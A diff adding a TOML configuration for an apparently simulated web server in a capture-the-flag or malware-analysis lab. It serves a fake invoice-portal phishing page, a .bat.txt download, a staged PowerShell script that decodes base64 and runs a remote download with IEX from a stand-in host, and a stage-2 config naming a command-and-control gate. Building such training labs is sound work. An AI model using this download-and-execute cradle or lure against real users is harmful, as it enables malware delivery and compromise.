@@ -1,0 +1,62 @@
+ttl_minutes = 60
+flag_prefix = "invoice"
+
+[[route]]
+method = "GET"
+path = "/"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html><html><head><meta charset="utf-8"><title>Harlow Supply - Invoice portal</title></head>
+<body style="font-family:sans-serif;max-width:32rem;margin:3rem auto"><h2>Harlow Supply</h2>
+<p>Your invoice 2026-1137 is ready.</p><p><a href="/dl/invoice-2026-1137.bat.txt">Download invoice</a></p></body></html>
+'''
+
+[[route]]
+method = "GET"
+path = "/dl/invoice-2026-1137.bat.txt"
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+headers = { "content-disposition" = 'attachment; filename="invoice-2026-1137.bat.txt"' }
+file = "invoice-2026-1137.bat.txt"
+
+[[route]]
+method = "GET"
+path = "/a/stage1.ps1"
+sets = ["got_stage1"]
+[route.when]
+header = { "user-agent" = 're:Invoice/3\.1$' }
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+body = '''# stage 1: environment check, then stage 2
+$d = [Environment]::UserDomainName
+if ($d -eq 'WORKGROUP') { exit }
+$s = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{{b64:d:s2}}'))
+$w = New-Object Net.WebClient
+$w.Headers.Add('X-Stage', '1')
+IEX $w.DownloadString("http://updates.msedge-cdn.invalid/b/$s")
+'''
+
+[[route]]
+method = "GET"
+path = "/b/{{d:s2}}"
+needs = ["got_stage1"]
+[route.when]
+header = { "x-stage" = '1' }
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+body = '''# stage 2: configuration
+$cfg = @{
+  campaign = 'invoice-q3'
+  c2       = 'https://updates.msedge-cdn.invalid/gate'
+  interval = 900
+  campaign_key = '{{flag}}'
+}
+'''
+
+[fallback]
+status = 404
+body = "Not Found"
